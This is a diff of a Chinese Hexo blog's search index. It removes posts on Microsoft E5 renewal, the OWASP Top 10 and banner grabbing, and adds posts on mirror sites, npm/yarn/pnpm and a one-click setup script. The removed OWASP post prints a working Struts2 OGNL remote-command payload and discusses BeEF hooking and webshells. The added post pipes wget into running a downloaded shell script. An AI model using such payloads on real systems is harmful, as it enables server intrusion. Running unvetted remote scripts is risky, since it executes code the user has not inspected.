@@ -1,1844 +1,461 @@
 <?xml version="1.0" encoding="utf-8"?>
-<search>
-  <entry>
-    <title>Microsoft365_E5_Renew_X 自己搭建网页版续签服务</title>
-    <url>/2023/07/21/Microsoft365-E5-Renew-X-%E8%87%AA%E5%B7%B1%E6%90%AD%E5%BB%BA%E7%BD%91%E9%A1%B5%E7%89%88%E7%BB%AD%E7%AD%BE%E6%9C%8D%E5%8A%A1/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>我找了一个GitHub上的docker搭建方法，结合我自己经验。应该可行，比较简单。</p>
-<span id="more"></span>
-
-<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/Microsoft365-E5-Renew-X-%E8%87%AA%E5%B7%B1%E6%90%AD%E5%BB%BA%E7%BD%91%E9%A1%B5%E7%89%88%E7%BB%AD%E7%AD%BE%E6%9C%8D%E5%8A%A1/1.png" alt="img"></p>
-<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/Microsoft365-E5-Renew-X-%E8%87%AA%E5%B7%B1%E6%90%AD%E5%BB%BA%E7%BD%91%E9%A1%B5%E7%89%88%E7%BB%AD%E7%AD%BE%E6%9C%8D%E5%8A%A1/2.png" alt="img"></p>
-<p>E5账号大家都白嫖上了吧！</p>
-<p>续签服务搭建在自己服务器上或许会安全点。我找了一个GitHub上的docker搭建方法，结合我自己经验。应该可行，比较简单。</p>
-<p><strong>买台VPS</strong></p>
-<p>VPS使用教学</p>
-<p>阿里云 腾讯云等服务器即可</p>
-<p><strong>连接VPS</strong></p>
-<p>买好VPS后获取VPS的公网IP地址</p>
-<p>端口默认22</p>
-<p>SSH连接你的VPS</p>
-<p><strong>更新环境</strong></p>
-<p>apt update -y &amp;&amp; apt install -y curl &amp;&amp; apt install -y socat &amp;&amp; apt install wget -y</p>
-<p><strong>安装sudo</strong></p>
-<p>apt-get install sudo</p>
-<p><strong>安装 Docker</strong></p>
-<p>sudo apt install docker.io -y &amp;&amp; sudo apt install docker-compose</p>
-<p><strong>自启动docker</strong></p>
-<p>sudo systemctl enable –now docker</p>
-<p><strong>下载镜像</strong></p>
-<p>docker pull hanhongyong&#x2F;ms365-e5-renew-x:latest</p>
-<p><strong>部署容器</strong></p>
-<p>docker run -d -p 1066:1066 -e TZ&#x3D;Asia&#x2F;Shanghai –name ms365 hanhongyong&#x2F;ms365-e5-renew-x:latest</p>
-<p><strong>初始密码</strong></p>
-<p>123456</p>
-<p><strong>修改密码</strong></p>
-<p>docker exec -it ms365 &#x2F;bin&#x2F;bash</p>
-<p>cd Deploy</p>
-<p>vim Config.xml</p>
-<p>输入i启动编辑模式</p>
-<p>修改密码</p>
-<p>输入esc退出编辑</p>
-<p>:wq! 回车 退出</p>
-<p>重启密码才会生效</p>
-<p><strong>重启续签服务</strong></p>
-<p>重启服务器后E5续签网页不会跟随重启</p>
-<p>需要以下命令</p>
-<p>docker start ms365</p>
-<p><strong>更多docker常用命令</strong></p>
-<p>docker ps -a 查看已经创建的容器</p>
-<p>docker ps -s 查看已经启动的容器</p>
-<p>docker start con_name 启动容器名为con_name的容器</p>
-<p>docker stop con_name 停止容器名为con_name的容器</p>
-<p>docker rm con_name 删除容器名为con_name的容器</p>
-<p><strong>原作者GitHub地址</strong></p>
-<p><a href="https://github.com/hongyonghan/Docker_Microsoft365_E5_Renew_X">https://github.com/hongyonghan/Docker_Microsoft365_E5_Renew_X</a></p>
-]]></content>
+<search> 
+  
+  
+    
+    <entry>
+      <title>自由软件中国镜像站汇总</title>
+      <link href="/2024/01/23/%E8%87%AA%E7%94%B1%E8%BD%AF%E4%BB%B6%E4%B8%AD%E5%9B%BD%E9%95%9C%E5%83%8F%E7%AB%99%E6%B1%87%E6%80%BB/"/>
+      <url>/2024/01/23/%E8%87%AA%E7%94%B1%E8%BD%AF%E4%BB%B6%E4%B8%AD%E5%9B%BD%E9%95%9C%E5%83%8F%E7%AB%99%E6%B1%87%E6%80%BB/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>自由软件中国镜像站汇总</p><span id="more"></span><pre><code>阿里云镜像：http://mirrors.aliyun.com/ 网易开源镜像站：http://mirrors.163.com/搜狐开源镜像站：http://mirrors.sohu.com/北京交通大学开源镜像站：http://mirror.bjtu.edu.cn兰州大学开源软件镜像站：http://mirror.lzu.edu.cn/厦门大学开源软件镜像站：http://mirrors.xmu.edu.cn/上海交通大学开源软件镜像站：http://ftp.sjtu.edu.cn/清华大学开源软件镜像站：http://mirrors.tuna.tsinghua.edu.cn/天津大学开源软件镜像站：http://mirror.tju.edu.cn/中国科学技术大学开源软件镜像站：http://mirrors.ustc.edu.cn/东北大学开源软件镜像站：http://mirror.neu.edu.cn/东软信息学院开源软件镜像站：http://mirrors.neusoft.edu.cn/浙江大学开源软件镜像站：http://mirrors.zju.edu.cn北京理工大学开源软件镜像站：http://mirror.bit.edu.cn华中科技大学开源软件镜像站：http://mirrors.hust.edu.cn/中山大学开源软件镜像站：http://mirror.sysu.edu.cn/大连理工大学开源软件镜像站：http://mirror.dlut.edu.cn/</code></pre>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>node-npm,yarn和pnpm区别</title>
+      <link href="/2023/08/13/node-npm-yarn%E5%92%8Cpnpm%E5%8C%BA%E5%88%AB/"/>
+      <url>/2023/08/13/node-npm-yarn%E5%92%8Cpnpm%E5%8C%BA%E5%88%AB/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>简单总结下npm,yarn和pnpm三种包管理器的区别</p><span id="more"></span><h2 id="一-npm"><a href="#一-npm" class="headerlink" title="一 npm"></a>一 npm</h2><h4 id="1-简述"><a href="#1-简述" class="headerlink" title="1 简述"></a>1 简述</h4><p>npm 是 Node Package Manager 的缩写，是一个 NodeJS 包管理和分发工具，我们可以使用它发布、安装和卸载 NodeJS 包。npm 是 JavaScript 运行时环境 Node.js 的默认包管理器。</p><h4 id="2-官网"><a href="#2-官网" class="headerlink" title="2 官网"></a>2 官网</h4><p><a href="https://www.npmjs.com/">https://www.npmjs.com/</a></p><h4 id="3-说明"><a href="#3-说明" class="headerlink" title="3 说明"></a>3 说明</h4><p><strong>npm2</strong>存在很严重的依赖嵌套关系</p><pre><code>node_modules- package-A-- node_modules--- package-B----- node_modules------ package-C-------- some-really-really-really-long-file-name-in-package-c.js</code></pre><p><strong>npm3</strong>扁平依赖</p><pre><code>node_modules- package-A-- node_modules--- package-B----- node_modules------ package-C-------- some-really-really-really-long-file-name-in-package-c.js</code></pre><p><code>npm</code>必须首先遍历所有的项目依赖关系，然后再决定如何生成扁平的<code>node_modules</code>目录结构。npm必须为所有使用到的模块构建一个完整的依赖关系树，这是一个耗时的操作,是<a href="https://link.juejin.cn/?target=https://github.com/npm/npm/issues/8826">npm安装速度慢的一个很重要的原因</a>。本地缓存的内容可以通过<code>npm cache ls</code>命令进行查看。本地缓存的设计有助于减少安装时间。</p><h2 id="二-yarn"><a href="#二-yarn" class="headerlink" title="二 yarn"></a>二 yarn</h2><h4 id="1-简述-1"><a href="#1-简述-1" class="headerlink" title="1 简述"></a>1 简述</h4><p>yarn 是 facebook 等公司在 npm v3 时推出的一个新的开源的 Node Package Manager，它的出现是为了弥补 npm 当时安装速度慢、依赖包版本不一致等问题。</p><h4 id="2-官网-1"><a href="#2-官网-1" class="headerlink" title="2 官网"></a>2 官网</h4><p><a href="https://yarnpkg.com/">https://yarnpkg.com/</a></p><h4 id="3-说明-1"><a href="#3-说明-1" class="headerlink" title="3 说明"></a>3 说明</h4><p>它的出现是为了弥补 npm 当时安装速度慢、依赖包版本不一致等问题。每个yarn安装都会生成一个类似于<code>npm-shrinkwrap.json</code>的<code>yarn.lock</code>文件，而且它是默认创建的。除了常规信息之外，<code>yarn.lock</code>文件还包含要安装的内容的校验和，以确保使用的库的版本相同。<code>yarn</code>无需互联网连接就能安装本地缓存的依赖项，它提供了离线模式。</p><p>yarn 有以下优点：</p><ol><li><p>安装速度快</p><ul><li>并行安装：npm 是按照队列依次安装每个 package，当前一个 package 安装完成之后，才能继续后面的安装。而 Yarn 是同步执行所有任务。</li><li>缓存：如果一个 package 之前已经安装过，yarn 会直接从缓存中获取，而不是重新下载。</li></ul></li><li><p>版本统一</p><p>yarn 创新性的新增了 yarn.lock 文件，它是 yarn 在安装依赖包时，自动生成的一个文件，作用是记录 yarn 安装的每个 package 的版本，保证之后 install 时的版本一致。不过随着后来 npm 也新增了作用相同的 package-lock.json，这个优势已经不太明显。</p></li></ol><h2 id="三-pnpm"><a href="#三-pnpm" class="headerlink" title="三 pnpm"></a>三 pnpm</h2><h4 id="1-简述-2"><a href="#1-简述-2" class="headerlink" title="1 简述"></a>1 简述</h4><p>2017 年 pnpm 推出。全称 Performance NPM，即高性能的 npm。</p><h4 id="2-官网-2"><a href="#2-官网-2" class="headerlink" title="2 官网"></a>2 官网</h4><p><a href="https://pnpm.io/">https://pnpm.io/</a></p><h4 id="3-说明-2"><a href="#3-说明-2" class="headerlink" title="3 说明"></a>3 说明</h4><p>pnpm采用了一种巧妙的方法，利用硬链接和符号链接来避免复制所有本地缓存源文件,同一个包 pnpm 只会安装一次，磁盘中只有一个地方写入，后面再次使用都会直接使 hardlink。即使一个包的不同版本，pnpm 也会极大程度地复用之前版本的代码。举个例子，比如 lodash 有 100 个文件，更新版本之后多了一个文件，那么磁盘当中并不会重新写入 101 个文件，而是保留原来的 100 个文件的 hardlink，仅仅写入那一个新增的文件。</p><h2 id="四-命令对比"><a href="#四-命令对比" class="headerlink" title="四 命令对比"></a>四 命令对比</h2><h3 id="npm-yarn-和-pnpm-之间命令的区别"><a href="#npm-yarn-和-pnpm-之间命令的区别" class="headerlink" title="npm yarn 和 pnpm 之间命令的区别"></a>npm yarn 和 pnpm 之间命令的区别</h3><table><thead><tr><th>-</th><th>npm</th><th>yarn</th><th>pnpm</th></tr></thead><tbody><tr><td>Install all</td><td>npm install</td><td>yarn</td><td>pnpm install</td></tr><tr><td>Install</td><td>npm install [package]</td><td>yarn add [package]</td><td>pnpm add [package]</td></tr><tr><td></td><td>npm install [package] -D</td><td>yarn add [package] -D</td><td>pnpm add -D [package]</td></tr><tr><td></td><td>npm install [package] -g</td><td>yarn global add [package]</td><td>pnpm add -g [package]</td></tr><tr><td>Uninstall</td><td>npm uninstall [package]</td><td>yarn remove [package]</td><td>pnpm remove [package]</td></tr><tr><td>Update</td><td>npm update [package]</td><td>yarn upgrade [package]</td><td>pnpm update [package]</td></tr></tbody></table><blockquote><p>参考文档</p><p><a href="http://events.jianshu.io/p/e02ffa9effe6">npm、 yarn 和 pnpm 的区别 - 简书 (jianshu.io)</a></p><p><a href="https://juejin.cn/post/6844903616109641736">一文看懂npm、yarn、pnpm之间的区别 - 掘金 (juejin.cn)</a></p></blockquote>]]></content>
+      
+      
       <categories>
-        <category>实用分享</category>
+          
+          <category> Web </category>
+          
       </categories>
-      <tags>
-        <tag>Onedrive</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>OWASP TOP 10漏洞介绍</title>
-    <url>/2023/07/21/OWASP-TOP-10%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>OWASP项目最具权威的就是其“十大安全漏洞列表”,这个列表总结了Web应用程序最可能、最常见、最危险的十大漏洞</p>
-<span id="more"></span>
-
-<p>跨站脚本漏洞</p>
-<ul>
-<li><p>漏洞原理：</p>
-<ul>
-<li>（1）持久型跨站：最直接的危害类型，跨站代码存储在服务器（数据库）。</li>
-<li>（2）非持久型跨站：反射型跨站脚本漏洞，最普遍的类型。用户访问服务器-跨站链接-返回跨站代码。</li>
-<li>（3）DOM跨站（DOM XSS）:DOM(document object model文档对象模型)，客户端脚本处理逻辑导致的安全问题。</li>
-</ul>
-</li>
-<li><p>漏洞靶场：</p>
-</li>
-</ul>
-<p><img src="https://cdn.alone-hk.cn/blog/images/post/img//uploads/2022/08/unnamed-file.jpeg" alt="图片"></p>
-<p>当我们访问这个页面时，我们的ＰＣ就在攻击者的beef中上线了<br><img src="https://cdn.alone-hk.cn/blog/images/post/img//uploads/2022/08/unnamed-file-1.jpeg" alt="图片"></p>
-<p>通过 beef，我们可以对上线的浏览器进行很多的后门操作比如最基本的弹窗：<br><img src="https://cdn.alone-hk.cn/blog/images/post/img//uploads/2022/08/unnamed-file-2.jpeg" alt="图片"></p>
-<ul>
-<li>漏洞实战演练：<a href="http://www.alliedjeep.com/87508.htm">http://www.alliedjeep.com/87508.htm</a> couponPHP CMS 1.0跨站脚本漏洞 couponPHP是优惠劵和交易网站的内容管理系统。 couponPHP CMS 1.0版本没有正确过滤 &#x2F;admin&#x2F;ajax&#x2F;comments_paginate.php 或 &#x2F;admin&#x2F;ajax&#x2F;stores_paginate.php的 “sEcho” GET 参数值，在实现上存在多个跨站脚本漏洞，可导致在用户浏览器会话中执行任意HTML和脚本代码。</li>
-<li>个人总结：以存储型跨站为例，我们在用户的页面输入的语句会存入到系统的数据库中，这样，当其他用户访问我们存入的信息时就造成了存储型跨站的攻击，图片为我定入的存储型跨站的利用是js。</li>
-</ul>
-<p>Sql注入漏洞</p>
-<ul>
-<li>漏洞原理：SQL注入攻击是黑客对数据库进行攻击的常用手段之一。随着B&#x2F;S模式应用开发的发展，使用这种模式编写应用程序的程序员也越来越多。但是由于程序员的水平及经验也参差不齐，相当大一部分程序员在编写代码的时候，没有对用户输入数据的合法性进行判断，使应用程序存在安全隐患。用户可以提交一段数据库查询代码，根据程序返回的结果，获得某些他想得知的数据，这就是所谓的SQL Injection，即SQL注入。</li>
-<li>漏洞靶场：在我们的靶场中我们会了解查询到底是怎么一回事，数据是怎么样传入的</li>
-</ul>
-<p><img src="https://cdn.alone-hk.cn/blog/images/post/img//uploads/2022/08/unnamed-file-3.jpeg" alt="图片"></p>
-<p>上面两个图片，是数据以get及post方式发送的代码内容，我们的参数就是以这种形式发送的。而后台接收后的样子类似是这样的 Select * from (xxx数据表) where what&#x3D;(‘id’) id为你输入的参数，而sql注入就是在这个语句后面加入攻击者自己构造的语句，使数据库查询出我们想要的数据并给前台一定的提示。 并会在我们的靶场中进行攻击学习.<br><img src="https://cdn.alone-hk.cn/blog/images/post/img//uploads/2022/08/unnamed-file-4.jpeg" alt="图片"></p>
-<p>漏洞实战演练：<a href="http://www.cnblogs.com/moqiang02/p/4061399.html">http://www.cnblogs.com/moqiang02/p/4061399.html</a></p>
-<p><img src="https://cdn.alone-hk.cn/blog/images/post/img//uploads/2022/08/unnamed-file-5.jpeg" alt="图片"></p>
-<ul>
-<li><p>个人总结：sql注入仍然是被利用最多的漏洞，他的危害程度和利用范围也是其他漏洞不可以比的，而且逐渐开始工具化，手工注入越来越少，虽然难度大的注入漏洞几乎只能用手工去做，但一点也不影响工具的推广和利用，比较常用的攻击工具sqlmap，可以实现大量的绕过和注入方法。当然，因为他的功能越来越强大，使用的方法也越来越复杂，有的注入点，有可能同样是用sqlmap，小白就注入不进去，可是有的老手就可以通过对语句和参数的修改注入成功。 当然有很多的注入点也需要自己手工去写一些脚本去进行测试，因为盲注这一形式的存在，给手工注入带来了巨大的麻烦，图片为我自己编写的盲注的小脚本，可以利用注入去暴力猜出用户的密码。<br><img src="https://cdn.alone-hk.cn/blog/images/post/img//uploads/2022/08/unnamed-file-6.jpeg" alt="图片"></p>
-</li>
-<li><p>POC框架</p>
-<ul>
-<li>基于原生POC编写练习</li>
-<li>基于框架POC编写练习</li>
-</ul>
-</li>
-</ul>
-<p>越权漏洞</p>
-<ul>
-<li><p>漏洞原理：是指超越权限或权力范围的意思。越权漏洞是Web应用程序中一种常见的安全漏洞。它的威胁在于一个账户即可控制全站用户数据。当然这些数据仅限于存在漏洞功能对应的数据。越权漏洞的成因主要是因为开发人员在对数据进行增、删、改、查询时对客户端请求的数据过分相信而遗漏了权限的判定。所以测试越权就是和开发人员拼细心的过程。</p>
-</li>
-<li><p>漏洞靶场：针对网站的权限绕过，后期会带大家搭建相对环境学习<br><img src="https://cdn.alone-hk.cn/blog/images/post/img//uploads/2022/08/unnamed-file-7.jpeg" alt="图片"></p>
-</li>
-<li><p>漏洞实战演练：</p>
-<p><a href="https://loudong.sjtu.edu.cn/show/CNVD-2017-04015">https://loudong.sjtu.edu.cn/show/CNVD-2017-04015</a></p>
-<p>　齐博CMS整站系统V7.0存在越权访问漏洞 个人总结：对于越权漏洞的主要挖掘方法：</p>
-<ul>
-<li><ul>
-<li>测试越权一般得有俩号。</li>
-<li>对userid。orderid等等ID要敏感，一旦发现，就多测测。</li>
-<li>某些厂商喜欢用纯数字的MD5作为用户的cookie，多注意发现。</li>
-<li>多使用抓包工具，多分析数据包，多修改数据包。</li>
-<li>多站在开发的角度去分析网站哪儿存在越权。</li>
-<li>多看看别人的漏洞 越权漏洞属于逻辑漏洞，这样的漏洞，不是代码的硬性错误，网站可以说他没有sql注入漏洞，但他不可以说他没有逻辑漏洞，只是每个人的思考方向不同，测试方法和角度也不一样，发现的逻辑漏洞也就不会相同。</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<p>目录漏洞</p>
-<ul>
-<li>漏洞原理：该漏洞旨在访问储存在Web根文件外的文件或者目录。主要分为以下两种 目录列表漏洞：用户访问网站目录地址时，能看到目录下所有文件列表，导致网站目录结构暴露，重要的敏感数据泄露。目录遍历漏洞：程序没有充分过滤用户输入的..&#x2F;之类的目录跳转符，导致用户可以通过提交目录跳转来遍历服务器上的任意文件。使用多个..符号，不断向上跳转，最终停留在根&#x2F;，通过绝对路径去读取任意文件。</li>
-<li>漏洞靶场：简单的网站框架就可以实现相应漏洞，在我们的靶场中会集成本漏洞</li>
-<li>漏洞实战演练：<a href="http://sec.sangfor.com.cn/vulns/236.html">http://sec.sangfor.com.cn/vulns/236.html</a>　 Pligg CMS 2.0.2 目录遍历漏洞<br><img src="https://cdn.alone-hk.cn/blog/images/post/img//uploads/2022/08/unnamed-file-8.jpeg" alt="图片"></li>
-<li>个人总结：其实在目录漏洞需要配合其他的漏洞进行组合攻击，单独目录漏洞的危害性并不大，但他的可利用程度确很高，当存在其他的漏洞时，这个漏洞就可以帮助我们获取到更多的权限。</li>
-</ul>
-<p>文件包含漏洞</p>
-<ul>
-<li>漏洞原理：程序开发人员通常会把要重复使用的函数写到单个文件中，在使用某个函数时直接在文件里面调用此函数无需再次编写。</li>
-<li>文件包含有两种： 本地文件包含配合本地的文件遍历漏洞，可以执行任意文件代码</li>
-<li>远程文件包含 ：即加载远程文件，在php.ini中开启allow_url_include、allow_url_fopen选项。开启后可以直接执行任意代码。配合本地的文件遍历漏洞，可以执行任意文件代码</li>
-<li>漏洞靶场：靶场为jsp语言，会带领大家搭建相对应的文件包含环境，但不存在靶场中</li>
-<li>漏洞实战演练：<a href="http://www.xuebuyuan.com/1062689.html">http://www.xuebuyuan.com/1062689.html</a>　 Phpcms 2007 远程文件包含漏洞</li>
-<li>个人总结：执行任意代码，包含恶意文件控制网站甚至控制服务器，这个漏洞的危害是巨大的，但他主要存在于ＰＨＰ的环境中。对环境的依赖程度也相对要高，确相对好整改，只要限制好目录的权限，这个漏洞可以造成的影响并不大。</li>
-</ul>
-<p>命令执行漏洞</p>
-<ul>
-<li>漏洞原理：用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令，可能会允许攻击者通过改变 $PATH 或程序执行环境的其他方面来执行一个恶意构造的代码。</li>
-<li>漏洞靶场：<br><img src="https://cdn.alone-hk.cn/blog/images/post/img//uploads/2022/08/unnamed-file-9.jpeg" alt="图片"></li>
-<li>漏洞实战演练：网上随处可见的struts2网站，只要是没有升级或打上补丁的，都会存在问题</li>
-<li>个人总结：最常见的命令执行漏洞就是struts2漏洞了，当然，还有weblogic等等，今天主要给大家分享struts2的相关知识 Struts2是一个基于MVC设计模式的Web应用框架，它本质上相当于一个servlet，在MVC设计模式中，Struts2作为控制器(Controller)来建立模型与视图的数据交互。Struts 2是Struts的下一代产品，是在 struts 1和WebWork的技术基础上进行了合并的全新的Struts 2框架。其全新的Struts 2的体系结构与Struts 1的体系结构差别巨大。Struts 2以WebWork为核心，采用拦截器的机制来处理用户的请求，这样的设计也使得业务逻辑控制器能够与ServletAPI完全脱离开，所以Struts 2可以理解为WebWork的更新产品。虽然从Struts 1到Struts 2有着太大的变化，但是相对于WebWork，Struts 2的变化很小。 对应ＰＯＣ： [“Content-Type”]&#x3D;”%{(#nike&#x3D;’multipart&#x2F;form-data’).(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess&#x3D;#dm):((#container&#x3D;#context[‘com.opensymphony.xwork2.ActionContext.container’]).(#ognlUtil&#x3D;#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd&#x3D;’ifconfig’).(#iswin&#x3D;(@java.lang.System@getProperty(‘os.name’).toLowerCase().contains(‘win’))).(#cmds&#x3D;(#iswin?{‘cmd.exe’,’&#x2F;c’,#cmd}:{‘&#x2F;bin&#x2F;bash’,’-c’,#cmd})).(#p&#x3D;new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process&#x3D;#p.start()).(#ros&#x3D;(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}” 简单的利用方法</li>
-</ul>
-<p>弱口令漏洞</p>
-<ul>
-<li>漏洞原理：就是说由常用数字、字母、字符等组合成的，容易被别人通过简单及平常的思维方式就能猜到的密码，利用弱口令结合计算机系统等漏洞可以做到入侵的事半功倍的效果 主要的探测方法为测试验证码的功能，如果目标站的验证机制不完善，或存在逻辑漏洞，则可以利用该漏洞进行暴力破解攻击，结合社工的结果进行测试，如果用户存在弱口令漏洞，就会被攻击方加以利用，伪装成普通用户的权限进行登录，扩大攻击者的权限范畴，增加网站的风限程度</li>
-<li>漏洞靶场：靶场的登录处就是这个漏洞 漏洞实战演练：本漏洞主要成因是人为的，需要手工去寻找。</li>
-<li>个人总结：只要做好社工，基本上网站全是弱口令，这是某个大神说的。我觉的非常的有道理。希望大家各级去尝试。</li>
-</ul>
-<p>文件上传漏洞</p>
-<ul>
-<li><p>漏洞原理：在于代码作者没有对访客提交的数据进行检验或者过滤不严，可以直接提交修改过的数据绕过扩展名的检验。</p>
-</li>
-<li><p>漏洞靶场： </p>
-<p><img src="https://cdn.alone-hk.cn/blog/images/post/img//uploads/2022/08/unnamed-file-11.jpeg" alt="图片"></p>
-</li>
-<li><p>漏洞实战演练：<a href="https://www.lvtao.net/shell/phpcms-upload-webshell.html">https://www.lvtao.net/shell/phpcms-upload-webshell.html</a>　 phpcms前台头像上传漏洞导致webshell详解及案例</p>
-</li>
-<li><p>个人总结：这个漏洞被黑客们利用的最为猖獗，利用上传漏洞可以直接得到WEBSHELL，危害等级超级高，现在的入侵中上传漏洞也是常见的漏洞。 主要是上传木马文件及反弹工具等，在网络上现在也存在这各种防护方法，具体的绕过我们就不讲了，主要分享一下，上传的东西，与方法。 上传webshell，按语言主要分为三种php,asp,jsp其他衍生的类型不计其数，但核心仍是这三种，主要目的就是通过webshell，对网站进行控制。</p>
-</li>
-</ul>
-<p>漏洞利用</p>
-<ul>
-<li>目的：我们整个攻击行为的目的，比如获取flag,目标服务器权限等等，根据我们不同的目的，我们要做出不同的针对性的攻击，可以大大节省我的时间和资源。 隐藏：在攻击的过程中，我们要学会隐藏自己，把我们的攻击行为隐藏起来，这样我们就可以保证我们在攻击的过程中不会被发现，导致我们的攻击过程被强行中断，减少不必要的工作量。</li>
-<li>特定场景的针对测试：每一个目标的环境就行人一样，都是维一的，没有一模一样的环境，所以我们要针对不同的环境去做不同的攻击，减少没必要的行为。</li>
-</ul>
-<p>权限提升</p>
-<p>当我们拿到webshell后，我们要做的就是权限提升了，我们真正开接触到我们的目标了现在。</p>
-<ul>
-<li><p>内部信息收集：</p>
-<ul>
-<li>根据我们的目标，我们要开始收拾信息，网站的基本信息，管理者的行为信息，目标的内部环境等，我们有了一个跳板就要把我们可以拿到的点都拿到手中，这样才可以保证我们的目的达成。</li>
-</ul>
-</li>
-<li><p>系统漏洞利用：</p>
-<ul>
-<li>我们的主要方法是溢出漏洞，当然也存在其他的提权方法，但在这节课中不涉及那些高级的应用了。在溢出漏洞中，我们首先要通过我们收集到的信息来确定我们可以利用的漏洞有可能有那些，如果运气好，我们的漏洞有可以利用的那直接利用已有的角本，我们可以直接拿到服务器的权限了，如果不能，那就要去一点点的测试，看看这个系统上安装了什么软件，然后去寻找一个可以让我们利用的溢出点，能过编写这个脚本来进行提权。比较常见的提权脚本有：<br><img src="https://cdn.alone-hk.cn/blog/images/post/img//uploads/2022/08/unnamed-file-12.jpeg" alt="图片"></li>
-</ul>
-</li>
-</ul>
-<p>当然，还有很多很多，我就不一一展示了，还有一部分要涉及到密码的寻找，如果，我们没有办法溢出，那我们就要想办法找到高级管理员的密码，来登录到高权限的帐户上去<br><img src="https://cdn.alone-hk.cn/blog/images/post/img//uploads/2022/08/unnamed-file-13.jpeg" alt="图片"></p>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> npm </tag>
+            
+            <tag> yarn </tag>
+            
+            <tag> pnpm </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>一键脚本建站</title>
+      <link href="/2023/08/13/%E4%B8%80%E9%94%AE%E8%84%9A%E6%9C%AC%E5%BB%BA%E7%AB%99/"/>
+      <url>/2023/08/13/%E4%B8%80%E9%94%AE%E8%84%9A%E6%9C%AC%E5%BB%BA%E7%AB%99/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>一键脚本上线！内置LDNMP建站脚本！</p><span id="more"></span><p>安装下载工具</p><p>如果没有安装，则可以使用<code>yum</code>命令进行安装，命令格式如下：</p><pre><code class="text">yum -y install wget</code></pre><p>这里的参数<code>-y</code>表对对于安装软件包之前的任何提示进行确认，相当于如果询问你“是否****[y&#x2F;n]”，你默认选择<code>y</code>。</p><p>如果您使用的是其他的发行版例如<a href="https://link.zhihu.com/?target=https://linux265.com/distro/45.html">Ubuntu</a>，<a href="https://link.zhihu.com/?target=https://linux265.com/distro/10.html">Debian</a>，一般系统默认安装有wget命令，如果没有安装可以通过以下命令安装。</p><pre><code class="text">sudo apt install wget</code></pre><p><strong>一键脚本</strong></p><pre><code>wget https://blog.alone-hk.cn//Download/kejilion.sh &amp;&amp; chmod +x kejilion.sh &amp;&amp; ./kejilion.sh</code></pre><p>若以上地址你无法使用请尝试</p><pre><code>wget https://blog.alone-hk.cn//Download/kejilion.sh &amp;&amp; chmod +x kejilion.sh &amp;&amp; ./kejilion.sh</code></pre><p>脚本展示图</p><p><a href="https://s1.ax1x.com/2023/08/13/pPufa9K.png"><img src="https://s1.ax1x.com/2023/08/13/pPufa9K.png" alt="img"></a></p><p>目前只支持Ubuntu和Debian系统，暂不支持其它系统！</p><p>此脚本目前比较基础，会不断进化，整合大家常用的脚本。方便使用。</p><p>LDNMP属于原创内容，建站更方便。</p>]]></content>
+      
+      
       <categories>
-        <category>安全</category>
+          
+          <category> Web </category>
+          
       </categories>
-      <tags>
-        <tag>漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Web应用中的信息泄漏以及攻击方法</title>
-    <url>/2023/07/22/Web%E5%BA%94%E7%94%A8%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E4%BB%A5%E5%8F%8A%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Banner收集或主动侦察是一种攻击类型，攻击者在此期间向他们的目标系统发送请求，以收集有关它的更多信息。如果系统配置不当，可能会泄漏自己的信息，如服务器版本，PHP或者ASP.NET版本，OpenSSH版本等。</p>
-<span id="more"></span>
-
-<p><strong>Banner收集&#x2F;主动侦查</strong></p>
-<p>Banner收集或主动侦察是一种攻击类型，攻击者在此期间向他们的目标系统发送请求，以收集有关它的更多信息。如果系统配置不当，可能会泄漏自己的信息，如服务器版本，PHP或者ASP.NET版本，OpenSSH版本等。</p>
-<p>在大多数情况下，Banner收集并不会涉及关键信息泄漏，不过可以让攻击者收集到开发过程中使用环境版本的信息。例如：如果目标在服务器上面使用的是php旧版本，由于没有更新，所以攻击者可以利用已知的漏洞攻击，也许会出现远程命令执行&#x2F;代码执行的漏洞。</p>
-<p>Banner信息收集举例：</p>
-<p>Nmap scan report for example.com (x.x.x.x)</p>
-<p>Host is up (0.037s latency).</p>
-<p>Not shown: 999 filtered ports</p>
-<p>PORT STATE SERVICE VERSION</p>
